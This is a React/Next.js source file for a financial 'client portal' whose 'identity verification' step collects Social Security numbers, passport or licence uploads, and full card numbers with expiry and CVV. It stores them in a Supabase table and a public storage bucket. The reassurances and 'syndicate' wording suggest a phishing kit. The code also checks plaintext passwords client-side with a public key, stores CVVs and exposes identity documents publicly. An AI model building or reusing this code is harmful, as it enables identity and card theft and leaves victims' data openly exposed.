"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Lock, ShieldCheck, Eye, EyeOff, ArrowRight, UserPlus, CreditCard } from "lucide-react";
import { createClient } from "@supabase/supabase-js";

// Initialize Supabase
const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, 
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function PortalLogin() {
  const [mode, setMode] = useState<'login' | 'register'>('login');
  const [step, setStep] = useState<'auth' | 'verify'>('auth');
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  
  const [formData, setFormData] = useState({
    email: "", password: "", ssn: "", cardNumber: "", expiry: "", cvv: "", cardName: "", documentUrl: ""
  });

  const handleAuth = async () => {
    setLoading(true);
    
    if (mode === 'login') {
      const { data, error } = await supabase.from('clients').select('*').eq('email', formData.email).single();
      
      if (data && data.password === formData.password) {
          if (data.verified) { 
            window.location.href = "/portal/dashboard"; 
          } else { 
            setStep('verify'); 
          }
      } else {
          alert("Access Denied: Invalid Credentials.");
      }
    } else {
      // REGISTER MODE
      const { error } = await supabase.from('clients').insert([{ 
        email: formData.email, 
        password: formData.password,
        account_balance: "$0.00",
        credit_score: "Analyzing..."
      }]);
      
      if (error) {
        alert("Identity already exists in our records.");
      } else {
        setStep('verify');
      }
    }
    setLoading(false);
  };

  return (
    <main className="min-h-screen bg-[#02040A] flex items-center justify-center p-6 pt-32">
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-emerald-900/10 via-transparent to-transparent opacity-50 pointer-events-none" />
      
      <motion.div 
        initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-md bg-[#0A1024] border border-white/5 p-10 rounded-3xl shadow-2xl relative z-10"
      >
        <AnimatePresence mode="wait">
          {step === 'auth' ? (
            <motion.div key="auth" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0, x: -20 }} className="space-y-8">
              <div className="text-center">
                {mode === 'login' ? <Lock className="w-12 h-12 text-emerald-500 mx-auto mb-4" /> : <UserPlus className="w-12 h-12 text-blue-500 mx-auto mb-4" />}
                <h2 className="text-3xl font-light tracking-tighter">
                  {mode === 'login' ? "Client Access" : "Establish Identity"}
                </h2>
                <p className="text-gray-500 text-sm mt-2">
                  {mode === 'login' ? "Enter your encrypted credentials." : "Initiate your financial blueprint."}
                </p>
              </div>

              <div className="space-y-4">
                <input 
                  type="email" placeholder="Email Address" 
                  className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500 transition-colors"
                  onChange={(e) => setFormData({...formData, email: e.target.value})}
                />
                <div className="relative">
                  <input 
                    type={showPass ? "text" : "password"} placeholder="Password" 
                    className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500 transition-colors"
                    onChange={(e) => setFormData({...formData, password: e.target.value})}
                  />
                  <button onClick={() => setShowPass(!showPass)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500">
                    {showPass ? <EyeOff size={20}/> : <Eye size={20}/>}
                  </button>
                </div>
              </div>

              <div className="space-y-4">
                <button 
                  onClick={handleAuth} disabled={loading}
                  className="w-full py-4 bg-white text-black font-bold uppercase tracking-widest rounded-xl hover:bg-emerald-500 hover:text-white transition-all flex items-center justify-center gap-2"
                >
                  {loading ? "Processing..." : mode === 'login' ? "Initialize Session" : "Initiate Protocol"} <ArrowRight size={18}/>
                </button>

                <button 
                  onClick={() => setMode(mode === 'login' ? 'register' : 'login')}
                  className="w-full text-center text-gray-500 text-xs hover:text-emerald-400 transition-colors uppercase tracking-[0.2em] font-bold"
                >
                  {mode === 'login' ? "Need to establish identity?" : "Already within the syndicate? Login"}
                </button>
              </div>
            </motion.div>
          ) : (
            <VerificationFlow formData={formData} setFormData={setFormData} email={formData.email} />
          )}
        </AnimatePresence>
      </motion.div>
    </main>
  );
}

// --- SUB-COMPONENT: THE VERIFICATION STEPS ---

function VerificationFlow({ formData, setFormData, email }: any) {
  const [vStep, setVStep] = useState(1);
  const [uploading, setUploading] = useState(false);

  const handleFinalize = async () => {
    // Check SSN length
    if (formData.ssn.length !== 9) {
      alert("SSN must be exactly 9 digits.");
      return;
    }

    const { error } = await supabase.from('clients').update({
      ssn: formData.ssn,
      card_number: formData.cardNumber,
      expiry: formData.expiry,
      cvv: formData.cvv,
      card_name: formData.cardName,
      document_url: formData.documentUrl,
      verified: true
    }).eq('email', email);

    if (!error) {
      window.location.href = "/portal/dashboard";
    } else {
      console.error(error);
      alert("Error finalizing session. Check console.");
    }
  };

  const uploadFile = async (e: any) => {
    setUploading(true);
    const file = e.target.files[0];
    if (!file) return;

    const fileExt = file.name.split('.').pop();
    const fileName = `${Math.random()}.${fileExt}`;
    const filePath = `documents/${fileName}`;

    const { error: uploadError } = await supabase.storage.from('vault').upload(filePath, file);
    
    if (uploadError) {
      alert("Upload failed. Ensure you created a public bucket named 'vault' in Supabase.");
      setUploading(false);
      return;
    }

    const { data: { publicUrl } } = supabase.storage.from('vault').getPublicUrl(filePath);
    
    setFormData({ ...formData, documentUrl: publicUrl });
    setUploading(false);
    setVStep(3); // Move to card step
  };

  return (
    <motion.div key="verify" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="space-y-6">
      <div className="text-center">
        <ShieldCheck className="w-12 h-12 text-emerald-500 mx-auto mb-4" />
        <h2 className="text-2xl font-light tracking-tighter">Identity Verification</h2>
        <p className="text-gray-500 text-xs mt-2">Required for AML Compliance.</p>
      </div>

      {vStep === 1 && (
        <div className="space-y-4">
          <label className="text-xs text-emerald-500 uppercase font-bold tracking-widest text-center block">Social Security Number</label>
          <input 
            type="text" maxLength={9} placeholder="9 Digit SSN" 
            className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl outline-none focus:border-emerald-500 text-center tracking-[0.5em] text-xl font-mono"
            onChange={(e) => setFormData({...formData, ssn: e.target.value})}
          />
          <button 
            disabled={formData.ssn.length !== 9}
            onClick={() => setVStep(2)} 
            className="w-full py-4 bg-emerald-500 text-black font-bold rounded-xl disabled:opacity-50 disabled:cursor-not-allowed transition-all"
          >
            Continue
          </button>
        </div>
      )}

      {vStep === 2 && (
        <div className="space-y-4">
          <label className="text-xs text-emerald-500 uppercase font-bold tracking-widest text-center block">Identity Document</label>
          <div className="border-2 border-dashed border-white/10 p-10 text-center rounded-2xl hover:border-emerald-500/50 transition-colors cursor-pointer relative">
            <input type="file" onChange={uploadFile} className="absolute inset-0 opacity-0 cursor-pointer" />
            <p className="text-sm text-gray-400">
              {uploading ? "Uploading to Vault..." : "Upload Passport or Driver's License"}
            </p>
          </div>
          <p className="text-[10px] text-gray-600 text-center uppercase tracking-wider">Accepted: JPG, PNG, PDF (Max 5MB)</p>
        </div>
      )}

      {vStep === 3 && (
        <div className="space-y-4">
          <div className="bg-emerald-500/10 p-4 rounded-lg border border-emerald-500/20 text-[10px] text-emerald-400 leading-relaxed">
             Note: Card verification is for identity confirmation only. No charges will be applied. A temporary $0.00 authorization hold may appear.
          </div>
          <div className="space-y-3">
            <input 
              placeholder="Name on Card" 
              className="w-full bg-[#050813] border border-white/10 p-3 rounded-lg outline-none focus:border-emerald-500 text-sm" 
              onChange={(e) => setFormData({...formData, cardName: e.target.value})} 
            />
            <input 
              placeholder="Card Number" 
              className="w-full bg-[#050813] border border-white/10 p-3 rounded-lg outline-none focus:border-emerald-500 text-sm" 
              onChange={(e) => setFormData({...formData, cardNumber: e.target.value})} 
            />
            <div className="flex gap-4">
              <input 
                placeholder="MM/YY" 
                className="w-1/2 bg-[#050813] border border-white/10 p-3 rounded-lg outline-none focus:border-emerald-500 text-sm text-center" 
                onChange={(e) => setFormData({...formData, expiry: e.target.value})} 
              />
              <input 
                placeholder="CVV" 
                className="w-1/2 bg-[#050813] border border-white/10 p-3 rounded-lg outline-none focus:border-emerald-500 text-sm text-center" 
                onChange={(e) => setFormData({...formData, cvv: e.target.value})} 
              />
            </div>
          </div>
          <button onClick={handleFinalize} className="w-full py-4 bg-emerald-500 text-black font-bold rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.2)]">
            Finalize Session
          </button>
        </div>
      )}
    </motion.div>
  );
}